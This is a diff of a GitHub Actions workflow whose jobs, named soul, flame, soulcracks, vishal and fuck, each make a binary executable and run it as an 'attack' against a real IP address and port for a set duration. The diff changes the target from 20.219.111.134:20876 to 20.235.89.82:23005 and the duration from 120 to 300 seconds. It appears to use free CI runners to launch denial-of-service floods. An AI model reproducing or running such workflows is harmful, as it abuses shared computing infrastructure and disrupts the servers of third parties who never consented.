@@ -13,7 +13,7 @@ jobs:
     - name: Make soul executable and run attack
       run: |
         chmod +x soul
-        ./soul 20.219.111.134 20876 120
+        ./soul 20.235.89.82 23005 300
 
   flame_attack:
     runs-on: ubuntu-22.04
@@ -26,7 +26,7 @@ jobs:
     - name: Make flame executable and run attack
       run: |
         chmod +x flame
-        ./flame 20.219.111.134 20876 120
+        ./flame 20.235.89.82 23005 300
 
   soulcracks_attack:
     runs-on: ubuntu-22.04
@@ -38,7 +38,7 @@ jobs:
     - name: Make soulcracks executable and run attack
       run: |
         chmod +x soulcracks
-        ./soulcracks 20.219.111.134 20876 120 ${{ matrix.n }}
+        ./soulcracks 20.235.89.82 23005 300 ${{ matrix.n }}
 
   vishal_attack:
     runs-on: ubuntu-22.04
@@ -51,7 +51,7 @@ jobs:
     - name: Make vishal executable and run attack
       run: |
         chmod +x vishal
-        ./vishal 20.219.111.134 20876 120
+        ./vishal 20.235.89.82 23005 300
 
   fuck_attack:
     runs-on: ubuntu-22.04
@@ -63,5 +63,5 @@ jobs:
     - name: Make fuck executable and run attack
       run: |
         chmod +x fuck
-        ./fuck 20.219.111.134 20876 120 ${{ matrix.n }}
+        ./fuck 20.235.89.82 23005 300 ${{ matrix.n }}
 
